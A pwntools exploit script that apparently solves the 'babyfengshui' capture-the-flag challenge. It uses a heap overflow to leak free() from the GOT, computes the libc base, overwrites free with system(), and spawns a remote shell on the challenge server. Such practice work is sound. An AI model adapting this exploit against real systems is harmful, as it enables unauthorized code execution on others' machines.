from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
# p = process("./babyfengshui")
p = remote("111.198.29.45" , 30884)
elf = ELF("./babyfengshui")
libc = ELF("/home/pwn/libc/libc-database/db/libc6-i386_2.23-0ubuntu10_amd64.so")

cmd = lambda c : p.sendlineafter("Action: " , str(c))
input_index = lambda i : p.sendlineafter("index: " , str(i))

def add(size , name , write_size , content):
	cmd(0)
	p.sendlineafter("size of description: " , str(size))
	p.sendlineafter("name: " , name)
	p.sendlineafter("text length: " , str(write_size))
	p.sendlineafter("text: " , content)

def delete(index):
	cmd(1)
	input_index(index)

def show(index):
	cmd(2)
	input_index(index)
	p.recvuntil("name: ")
	name = p.recvuntil("\n" , drop = True)
	p.recvuntil("description: ")
	desc = p.recvuntil("\n" , drop = True)
	return [name , desc]

def edit(index , size , content):
	cmd(3)
	input_index(index)
	p.sendlineafter("text length: " , str(size - 1))
	p.sendlineafter("text: " , content)


size = 0x30
array_addr =  0x0804B080 

add(size , "a" , size - 5 , "a" ) # 0 - 1
add(size , "b"  , size - 5 , "a") # 1 - 2
add(size , "t" , size - 5 , "/bin/sh\x00")
delete(0)
add(0x40 , "c"  , 1, "a" ) # 2 - 3 # fake_size != size && fake_size <= 0x80 (consume user a's chunk(size = 0x88  && in unsorted bin))
free_got = elf.got["free"]
payload = "a" * (size + 0x88 + (size + 8) + 8) + p32(free_got)
# debug()
add(size , "d" , len(payload) , payload) # 3 - 4

name , desc = show(1)
free_addr = u32(desc[:4])
print(hex(free_addr))

libc_base = free_addr - libc.sym["free"]
system = libc_base + libc.sym["system"]

edit(1 	, 5 , p32(system))

delete(2)

p.interactive()